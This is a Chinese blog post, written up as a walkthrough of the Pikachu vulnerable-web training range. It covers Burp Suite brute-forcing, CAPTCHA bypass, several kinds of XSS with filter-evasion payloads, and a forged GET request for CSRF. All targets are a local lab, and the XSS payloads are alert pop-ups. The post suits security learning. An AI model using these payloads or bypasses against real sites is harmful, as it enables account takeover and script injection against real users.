<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pikachu靶场漏洞复现记录 | T0mrvvi1b3t‘s blog</title><meta name="author" content="T0mrvvi1b3t"><meta name="copyright" content="T0mrvvi1b3t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="暴力破解基于表单的暴力破解 bp抓包，发送到 Intruder模块（快捷键ctrl+i    之后点击右上角 start attack（开始爆破  验证码绕过验证码的验证流程一般为：  客户端登陆页面，后台生成验证码：后台使用算法生成图片，并将图片返回到客户端；同时将算法生成的值全局赋值存到SESSION中。 校验验证码：客户端将认证信息和验证码一同提交；后台对提交的验证码与SESSION中的">
<meta property="og:type" content="article">
<meta property="og:title" content="Pikachu靶场漏洞复现记录">
<meta property="og:url" content="http://t0mrvvi1b3t.top/2021/05/18/pikachu/index.html">
<meta property="og:site_name" content="T0mrvvi1b3t‘s blog">
<meta property="og:description" content="暴力破解基于表单的暴力破解 bp抓包，发送到 Intruder模块（快捷键ctrl+i    之后点击右上角 start attack（开始爆破  验证码绕过验证码的验证流程一般为：  客户端登陆页面，后台生成验证码：后台使用算法生成图片，并将图片返回到客户端；同时将算法生成的值全局赋值存到SESSION中。 校验验证码：客户端将认证信息和验证码一同提交；后台对提交的验证码与SESSION中的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg">
<meta property="article:published_time" content="2021-05-18T12:28:23.541Z">
<meta property="article:modified_time" content="2021-05-24T12:39:02.478Z">
<meta property="article:author" content="T0mrvvi1b3t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069584450-13.jpg"><link rel="canonical" href="http://t0mrvvi1b3t.top/2021/05/18/pikachu/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":false,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-05-24 20:39:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">T0mrvvi1b3t‘s blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pikachu靶场漏洞复现记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T12:28:23.541Z" title="发表于 2021-05-18 20:28:23">2021-05-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-24T12:39:02.478Z" title="更新于 2021-05-24 20:39:02">2021-05-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">靶场漏洞复现</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/web%E5%AD%A6%E4%B9%A0/">web学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pikachu靶场漏洞复现记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p><img src="https://img.vim-cn.com/85/6ce77643b8f836338a671fc2d48cfc8af9e0bb.png"></p>
<p>bp抓包，发送到 Intruder模块（快捷键ctrl+i</p>
<p><img src="https://img.vim-cn.com/c2/f54ad79a6cac76cc51be54a00efa92becd6330.png" alt="1"></p>
<p><img src="https://img.vim-cn.com/45/5c65c441cf3a0d43e4b0ec9c2b2e2700940053.png" alt="2"></p>
<p><img src="https://img.vim-cn.com/1b/9b560a9e5d0b9ec16a2a6d02a11a804eb111e7.png" alt="3"></p>
<p>之后点击右上角 start attack（开始爆破</p>
<p><img src="https://img.vim-cn.com/8c/ca0eff454fbaa4d9dfb4500a4fe694c4a23529.png" alt="4"></p>
<h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><p>验证码的验证流程一般为：</p>
<ol>
<li>客户端登陆页面，后台生成验证码：后台使用算法生成图片，并将图片返回到客户端；同时将算法生成的值全局赋值存到SESSION中。</li>
<li>校验验证码：客户端将认证信息和验证码一同提交；后台对提交的验证码与SESSION中的进行比较；</li>
<li>客户端重新刷新页面，再次生成新的验证码：验证码算法中一般包含随机函数，所以每次刷新都会改变。</li>
</ol>
<p>判断是否可以进行暴力破解的方法：</p>
<p>账号密码随便输，比较是否输入验证码两种情况系统的提示。</p>
<p>当我们不输入验证码时，会提醒我们输入验证码；</p>
<p>当输入错误的验证码时，会提醒验证码错误。接下来输入正确的验证码，提示用户名或者密码不存在</p>
<h3 id="on-client"><a href="#on-client" class="headerlink" title="on client"></a>on client</h3><p>常见问题：</p>
<ul>
<li>使用前端js来实现验证码。</li>
<li>将验证码在cookie中泄露，容易被获取。</li>
<li>将验证码在前端源代码中泄露，容易被获取。</li>
</ul>
<p><img src="https://img.vim-cn.com/3d/803d8b914ab679933e2b8d3a994db413aa5376.png"></p>
<p>抓包发送到Intruder模块，只将用户名和密码设置为变量，验证码为正确验证码，开始爆破即可</p>
<h3 id="on-server"><a href="#on-server" class="headerlink" title="on server"></a>on server</h3><p>常见问题：</p>
<ul>
<li>验证码在后台不过期，导致长时间可以被使用**.**</li>
<li>验证码校验不严格，逻辑出现问题**.**</li>
<li>验证码设计的太过简单和有规律，容易被猜测**.**</li>
</ul>
<p><img src="https://img.vim-cn.com/6d/74697edb57355f3f95a65903924ebb9e560d2f.png"></p>
<p>确认验证码的有效性。当不输入验证码或者输入验证码错误时，提示验证码不能为空或验证码错误</p>
<p>抓包发送到repeater模块中修改验证码的值，判断后台对验证码是否验证，发现存在验证</p>
<p>使用正确验证码，返回用户名或密码错误，修改用户名或密码的值再次发送，发现仍提示用户名或密码错误，得到结论，验证码存在不过期的问题接下来就直接将用户名密码设为变量爆破就可以了</p>
<h1 id="Cross-Site-Scripting-–-XSS"><a href="#Cross-Site-Scripting-–-XSS" class="headerlink" title="Cross-Site Scripting – XSS"></a>Cross-Site Scripting – XSS</h1><p>危害：存储型 &gt; 反射型 &gt; DOM型</p>
<p>用户访问含有xss漏洞的网站，触发脚本，网站返回用户带有恶意代码的页面，执行脚本，将数据返回给攻击者，攻击者可用伪造用户进行一些操作</p>
<p>反射型：一次性</p>
<p>存储型：恶意代码存储在数据库里边，常见于留言板，注册页面等等</p>
<p>DOM型：不与后台数据库进行交互，通过DOM操作前端代码输出的时候产生的问题，一次性，类似反射型</p>
<p>进行测试XSS漏洞时，可以先传入一些字符来判断是否对输入有过滤</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss( get )"></a>反射型xss( get )</h2><p><img src="https://img.vim-cn.com/f4/4872bdf2a3aca7f0bfcd4df92c5ae27fc00f48.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现对输入长度有限制，修改长度限制，再次输入，即可触发弹窗.</p>
<p><img src="https://img.vim-cn.com/5d/c54793f8b28a1d956094381770e11ffa1ebccb.png"></p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss( post )"></a>反射型xss( post )</h2><p><img src="https://img.vim-cn.com/34/df3d0fe9d4b389dab6ca80989d1b1ed91e6e78.png"></p>
<p>用bp抓包，爆破用户名和密码（也可点击右上角提示）登陆之后</p>
<p>在输入框中输入</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可触发弹窗</p>
<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p><img src="https://img.vim-cn.com/c0/5287300170534ff4c119a872a8b485305fcae8.png"></p>
<p>payload👇</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p><img src="https://img.vim-cn.com/da/028a359d0666622deed8532129730b5b1c9c54.png"></p>
<p><img src="https://img.vim-cn.com/ff/9da34465c173f02d6012738a899ff77cc7a8f8.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">         document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">      <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;!--&lt;a href=<span class="string">&quot;&quot;</span> onclick=(<span class="string">&#x27;xss&#x27;</span>)&gt;--&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> type=<span class="string">&quot;text&quot;</span>  value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;button&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span> /&gt;</span><br><span class="line">   &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;        </span><br></pre></td></tr></table></figure>

<p>可以发现只需要把<code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;</code>闭合了，构造payload👇</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //只需要点击对应的链接即可触发弹窗</span><br><span class="line"></span><br><span class="line">&quot;&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> //将鼠标移到对应位置即可触发弹窗</span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //直接在a标签里添加onclick事件</span><br></pre></td></tr></table></figure>

<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p><img src="https://img.vim-cn.com/e0/b1735fd25bd029c088bf046c3b5540bd6e7330.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;xssd_main&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      function domxss()&#123;</span><br><span class="line">         var str &#x3D; window.location.search;</span><br><span class="line">         var txss &#x3D; decodeURIComponent(str.split(&quot;text&#x3D;&quot;)[1]);</span><br><span class="line">         var xss &#x3D; txss.replace(&#x2F;\+&#x2F;g,&#39; &#39;);</span><br><span class="line">&#x2F;&#x2F;       alert(xss);</span><br><span class="line"></span><br><span class="line">         document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F;试试：&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br><span class="line">      &#x2F;&#x2F;试试：&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;!--&lt;a href&#x3D;&quot;&quot; onclick&#x3D;(&#39;xss&#39;)&gt;--&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;text&quot; name&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot;  value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;请说出你的伤心往事&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;dom&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;       </span><br></pre></td></tr></table></figure>

<p>可以发现，与前边的基本一样。。没什么过滤。可以继续使用上一个的payload</p>
<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><img src="https://img.vim-cn.com/d7/516c1722d0ca48ceb34a328db75e26af5a9bf6.png"></p>
<p>现在两个框里都尝试输入一些</p>
<p>例如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后点击提交，什么都没有发生，这时候我们登陆后台看看（右上角有提示</p>
<p>用户名密码与之前的一样</p>
<p>登陆之后可看到弹窗</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="https://img.vim-cn.com/a1/e4a14a9d8da6bf71646fe2ec990d4f46bb2f8b.png"></p>
<p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回：别说这些&#39;&gt;&#39;的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>

<p>尝试大小写绕过检测<code>&lt;ScriPT&gt;alert(&#39;xss&#39;)&lt;/ScriPT&gt;</code></p>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p><img src="https://img.vim-cn.com/c1/db094c6ab94a2fd34ed92b5777a75bf7b01439.png"></p>
<p>审查元素可以发现，这是将输入的内容转到了a标签里作为href的值👇</p>
<p><img src="https://img.vim-cn.com/06/f22454f2d5c7b98c81f4369d6d3377a82382aa.png"></p>
<p>而且还对一些字符进行了转义，我们可以直接令href的值为空并且添加一个onclick事件（也可以是onmouseover等）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#39; onclick&#x3D;&#39;alert(123)&#39;</span><br></pre></td></tr></table></figure>

<p>之后点击生成的链接即可触发事件实现弹窗</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="https://img.vim-cn.com/82/a0bb2386276e9146153cb681dc97271ef9af8b.png"></p>
<p>测试发现输入127.0.0.1或者输入值为空的话会返回一个链接</p>
<p><img src="https://img.vim-cn.com/ef/201163c6166686531846759a8db1905cae2fc8.png"></p>
<p>尝试利用引号来闭合利用事件来触发，发现引号被转义了。那就利用Javascript伪协议来实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1);</span><br></pre></td></tr></table></figure>

<p>之后点击链接即可触发弹窗</p>
<h3 id="关于javascript伪协议："><a href="#关于javascript伪协议：" class="headerlink" title="关于javascript伪协议："></a>关于javascript伪协议：</h3><p>这个协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。若javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</p>
<p><code>&lt;a&gt;</code>标签定义超链接，用于从一个页面链接到另一个页面，最重要的属性是 href 属性，它指定链接的目标。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p><img src="https://img.vim-cn.com/73/aae0865e6e1c1d2e50961a7ac46b2f1e9db7b0.png"></p>
<p>可以发现<code>&lt;script&gt;</code>标签中有几行代码👇</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    $ms&#x3D;&#39;123&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$ms的值即为输入值</span><br></pre></td></tr></table></figure>

<p>所以我们可以先闭合<code>&lt;script&gt;</code>标签实现弹窗<code>&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<p>也可用引号闭合一下之后直接加一段<code>alert(&#39;xss&#39;)</code>即可payload：<code>&#39;;alert(&#39;xss&#39;);//</code> .<code>//</code>是为了注释掉原有的引号和分号. </p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​        在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了，所以CSRF攻击也被称为”one click”攻击</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>​        判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作（增删改）是否容易被伪造</p>
<p>1、对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造；</p>
<p>　–比如修改管理员账号，并不需要验证旧密码，导致请求容易被伪造</p>
<p>　–比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造</p>
<p>2、确认凭证的有效期（这个问题会提高CSRF被利用的概率）</p>
<p>　–虽然推出或者关闭了浏览器，但是cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变得简单</p>
<h3 id="与XSS区别"><a href="#与XSS区别" class="headerlink" title="与XSS区别"></a>与XSS区别</h3><p>​        CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏</p>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF( get )"></a>CSRF( get )</h2><p>点击右上角的提示，我们可以得到几个账号，登陆后可以看到个人信息</p>
<p><img src="https://img.vim-cn.com/69/2b33696b5316b18fee8a7103c882650015f574.png"></p>
<p>尝试修改一下个人信息</p>
<p><img src="https://img.vim-cn.com/ff/a516c0b7a7ef5bb2662ff899e6fcf57998968e.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>可以根据url的构造，进行伪造并且诱骗用户点击即可实现csrf攻击，例如 构造一个修改邮箱的url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;123456@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>若用户在登陆状态下点击url则信息会被修改</p>
